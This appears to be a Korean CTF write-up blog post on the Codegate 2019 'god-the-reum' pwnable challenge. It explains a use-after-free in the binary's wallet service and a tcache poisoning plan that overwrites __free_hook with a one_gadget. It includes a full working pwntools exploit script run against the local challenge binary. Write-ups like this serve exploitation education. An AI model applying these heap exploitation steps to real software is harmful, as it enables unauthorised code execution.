---
layout: post
cover: 'assets/images/cover8.jpg'
navigation: true
title: 'Codegate2019 - God the reum'
date: 2019-03-09
tags: pwnable codegate writeup
subclass: 'post'
logo: 'assets/images/ghost.png'
author: lanphere
categories: lanphere
disqus: true
---

```
[*] '/mnt/hgfs/Shared/god-the-reum'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

보호 기법은 다 걸려 있고 주어진 Libc는 2.27이다.

문제에서 쓰이는 구조체는 아래와 같이 생겼다.

```
struct wallet {
  void *addr;
  void *size;
}
```

아래는 메뉴 화면이다.

```
====== Ethereum wallet service ========
1. Create new wallet
2. Deposit eth
3. Withdraw eth
4. Show all wallets
5. exit
select your choice : 
```

1번 메뉴는 말 그대로 지갑을 만드는 메뉴, 즉 malloc()이다. addr 포인터는 `malloc(0x82)`로 할당하고, 지갑을 만들 때의 초기 금액을 입력을 받는다.
재밌는 것은 입력받은 금액이 malloc의 인자면서 동시에 할당된 메모리에 쓰는 값이다. 다시 말해

```
printf("how much initial eth? : ", 0LL);
__isoc99_scanf("%llu", &size);
wallet_addr->size = malloc(size);
if ( wallet_addr->size )
  *wallet_addr->size = size;
```

이렇게 되어 있기 때문에 임의 사이즈의 chunk를 할당할 수 있다.

2번, 3번 메뉴는 정수 값을 입력받아 지갑에 있는 돈에 더하고 빼는 것이라 크게 특별한 부분은 없지만 3번 메뉴에서 출금하고 난 후의 잔액이 0원이면 할당했던 size포인터를 free시킨다. 하지만 free하고 나서 포인터를 초기화하지 않기 때문에 UAF취약점이 존재하며, 해당 포인터에 모든 메뉴에서 접근 가능하다.

```
void __cdecl Withdraw_eth(wallet *a1)
{
  __int64 v1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("how much you wanna withdraw? : ");
  __isoc99_scanf("%llu", &v1);
  *a1->size -= v1;
  if ( !*a1->size )
    free(a1->size);
  puts("withdraw ok !\n");
}
```

또 숨겨진 메뉴로 developer라는 메뉴가 있다.
```
void __cdecl developer(wallet *a1)
{
  dummy();
  puts("this menu is only for developer");
  puts("if you are not developer, please get out");
  sleep(1u);
  printf("new eth : ");
  __isoc99_scanf("%10s", a1->size);
}
```

사실 deposit메뉴로도 데이터를 쓸 수 있지만 편하게 익스하라고 만들어둔 메뉴가 아닐까 싶다. depoist은 정수형으로 입력받고 쓰지만
이 메뉴는 문자열로 받는다.

그래서 시나리오는

1. 적당히 큰 chunk를 할당 후 해제(libc leak)
2. tcache에 들어갈 정도의 chunk 할당 후 해제
3. fd pointer overwrite를 해서 이후 malloc에서 __free_hook을 할당 받음
4. __free_hook에 one_gadget의 주소를 overwrite
5. free 호출

```
from pwn import *


def sla(x, y): return p.sendlineafter(x, y)


def ru(x): return p.recvuntil(x)


def create(size):
    sla('choice : ', str(1))
    sla('eth? : ', str(size))


def deposit(idx, amount):
    sla('choice : ', str(2))
    sla('no : ', str(idx))
    sla('deposit? : ', str(amount))


def withdraw(idx, amount):
    sla('choice : ', str(3))
    sla('no : ', str(idx))
    sla('withdraw? : ', str(amount))


def show():
    sla('choice : ', str(4))


def developer(idx, data):
    sla('choice : ', str(6))
    sla('no : ', str(idx))
    sla('new eth : ', data)


p = process('./god-the-reum', env={'LD_PRELOAD': './libc-2.27.so'})
bin = ELF('./god-the-reum')
libc = ELF('./libc-2.27.so')

free_hook_offset = 0x3ed8e8
one_gadget_offset = 0x4f322  # 0x4f2c5 0x4f322 0x10a38c

# gdb.attach(p, '')

# libc leak
create(0x1000)  # 1
create(0x10)    # 2
withdraw(0, 0x1000)
show()
ru('ballance ')
libc_addr = int(ru('\n')[:-1]) - 0x3ebca0
log.info('Libc Addr: ' + hex(libc_addr))

# tcache
withdraw(1, 0x10)
developer(1, p64(libc_addr + free_hook_offset))
create(0x10)    # 3
create(0x10)    # 4
developer(3, p64(libc_addr + one_gadget_offset))
withdraw(2, 0x10)

p.interactive()
```

